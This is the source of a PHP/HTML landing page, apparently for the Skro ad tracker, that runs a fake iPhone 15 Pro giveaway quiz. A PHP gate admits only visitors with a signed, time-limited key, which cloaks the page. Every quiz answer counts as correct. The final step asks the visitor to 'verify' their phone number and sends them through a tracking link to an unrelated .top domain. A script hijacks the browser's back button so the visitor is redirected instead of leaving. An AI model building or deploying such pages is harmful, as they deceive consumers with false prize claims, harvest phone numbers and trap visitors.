
<?php
    const PROTECTION_TOKEN = 'MWI1ZmJkY2ViZjNjNTg3NzlmNzVjM2M1ZDYwYzY0YWM='; // Your landing protection token
    const KEY_TTL = '30 minutes'; // How long KEY should be valid. Valid formats are explained here: http://php.net/manual/en/datetime.formats.php
    const KEY_GET_PARAM = 'key'; // GET parameter with Skro landing key.

    $key = isset($_GET[KEY_GET_PARAM]) ? rawurldecode($_GET[KEY_GET_PARAM]) : exit('Access denied');
    if (!$key = base64_decode($key)) {
        exit('Access denied');
    }
    if (!$key = json_decode($key, true)) {
        exit('Access denied');
    }
    if (!isset($key['timestamp']) || !isset($key['hash'])) {
        exit('Access denied');
    }
    $signedHash = hash_hmac('sha1', $key['timestamp'], PROTECTION_TOKEN);
    if ($signedHash !== $key['hash'] || strtotime(KEY_TTL, $key['timestamp']) < time()) {
        exit('Access denied');
    }
?>
    
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Attention!</title>
	<link rel="stylesheet" href="css/style.css">

</head>

<body>
<div class="main">
	<div class="box">
		<div class="box__header">
			<h1>You have the chance to win the new iPhone 15 Pro!</h1>
		</div>
		<div class="box__body">
			<img src="images/phone.jpg" alt="">
		</div>
		<div class="box__footer">
			<p>
				<span class="primary">ATTENTION!</span>
				You will need to answer 3 questions correctly!
			</p>

			<div class="btn-wrapper">
				<a class="btn-block action-btn" href="baidu.com">Ok!</a>
			</div>
		</div>
	</div>

	<div class="box hidden">
		<div class="box__header">
			<h2>Question 1/3:</h2>
		</div>
		<div class="box__body">
			<p style="text-align:justify">
				Does iPhone 15 pro has support for 4K video?
			</p>
		</div>
		<div class="box__footer">
			<div class="btn-wraper">
				<a class="btn-no action-btn" href="#">NO</a>
				<a class="btn-yes action-btn" href="#">YES</a>
			</div>
		</div>
	</div>

	<div class="box hidden">
		<div class="box__header">
			<h2>Question 2/3:</h2>
		</div>
		<div class="box__body">
			<p style="text-align:justify">
				Does iPhone 15 Pro come with 1 TB storage option?
			</p>
		</div>
		<div class="box__footer">
			<div class="btn-wraper">
				<a class="btn-no action-btn" href="#">NO</a>
				<a class="btn-yes action-btn" href="#">YES</a>
			</div>
		</div>
	</div>

	<div class="box hidden">
		<div class="box__header">
			<h2>Question 3/3</h2>
		</div>
		<div class="box__body">
			<p style="text-align:justify">
				Up to 50 percent charge in around 30 minutes is possible?
			</p>
		</div>
		<div class="box__footer">
			<div class="btn-wraper">
				<a class="btn-no action-btn" href="#">NO</a>
				<a class="btn-yes action-btn" href="#">YES</a>
			</div>
		</div>
	</div>




	<div class="box hidden">
		<div class="box__header">
			<h2>Thanks.</h2>
		</div>
		<div class="box__body">
			<p style="text-align:justify">
				All your answers are correct. You have a chance to win a new phone. You need to first verify your phone number..
			</p>
		</div>
		<div class="box__footer">
			<div class="btn-wrapper">
				<a class="btn-block mainButton" href="https://skrotrack.com/click" target="_blank" onclick="setTimeout(function() { window.location = 'https://nearby-massage.top'; }, 100);" id="final-button">CONTINUE</a>
			</div>
		</div>
	</div>

</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>

<script>
	(function ($) {
		$(document).ready(function () {
			var $aBtn = $('.action-btn');
			$aBtn.on('click', function (e) {
				e.preventDefault();
				$(this)
						.closest('.box')
						.addClass('hidden')
						.next()
						.removeClass('hidden')
						.addClass('animated fadeIn');
			});
		});
	})(jQuery);
</script>

<script>
    // 当页面加载完成时，立即向history栈添加一个状态
    history.pushState(null, null, location.href);
    
    window.onpopstate = function(event) {
        // 这里处理用户点击浏览器后退按钮的情况
        // 重定向用户到指定页面, 比如 Google
        location.href = 'https://skrotrack.com/click';
        // 或者重定向用户到他们之前的页面
        // history.go(-1);
    }
</script>



</body>
</html>